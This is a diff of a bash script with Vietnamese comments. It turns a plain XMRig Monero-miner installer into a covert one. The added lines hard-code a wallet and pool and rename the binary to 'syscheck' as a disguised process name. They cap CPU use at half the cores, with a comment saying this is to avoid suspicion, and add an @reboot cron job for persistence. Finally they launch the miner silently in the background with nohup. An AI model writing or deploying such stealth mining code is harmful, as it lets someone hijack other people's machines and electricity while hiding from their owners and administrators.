@@ -1,6 +1,15 @@
 #!/bin/bash
 
-echo "🔧 Bắt đầu cài XMRig vào thư mục ~/xmrig..."
+# ======= Cấu hình =======
+WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WORKER="silent_$(hostname)"
+POOL="pool.supportxmr.com:3333"
+CPU_THREADS=$(($(nproc) / 2)) # Dùng 50% số core để tránh bị nghi ngờ
+PRIORITY=1                    # Ưu tiên thấp
+CUSTOM_NAME="syscheck"       # Tên process giả mạo
+# ========================
+
+echo "🔧 Cài XMRig (ẩn mình) vào ~/xmrig..."
 
 # Cài thư viện cần thiết
 sudo apt update
@@ -12,23 +21,36 @@ rm -rf xmrig
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig
 
-# Build
+# Build XMRig
 mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$(nproc)
 
-# Tạo script khởi động
+# Đổi tên binary để tránh bị soi
 cd ~
-cat > ~/xmrig/start.sh << 'EOF'
+mkdir -p xmrig/silent
+cp ~/xmrig/build/xmrig ~/xmrig/silent/$CUSTOM_NAME
+chmod +x ~/xmrig/silent/$CUSTOM_NAME
+
+# Tạo file khởi động
+cat > ~/xmrig/silent/start.sh << EOF
 #!/bin/bash
-cd ~/xmrig/build
-./xmrig -o pool.supportxmr.com:3333 -u 47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL -k --coin monero --cpu-priority=3
+cd ~/xmrig/silent
+./$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0
 EOF
 
-chmod +x ~/xmrig/start.sh
+chmod +x ~/xmrig/silent/start.sh
 
-# Chạy luôn!
+# Tạo cronjob chạy ngầm khi reboot (tùy chọn)
+(crontab -l 2>/dev/null; echo "@reboot bash ~/xmrig/silent/start.sh > /dev/null 2>&1") | crontab -
+
 echo ""
-echo "🚀 Cài xong! Đang bắt đầu đào với full CPU cho ví của bạn..."
+echo "✅ Đã cài đặt XMRig (ẩn danh)"
+echo "👷 Worker: $WORKER"
+echo "🔧 Đổi tên process thành: $CUSTOM_NAME"
+echo "🧠 Dùng $CPU_THREADS luồng CPU (trong tổng $(nproc))"
+echo "📍 Pool: $POOL"
+echo ""
+echo "🚀 Bắt đầu đào trong nền..."
 sleep 2
-~/xmrig/start.sh
+nohup ~/xmrig/silent/start.sh > /dev/null 2>&1 &
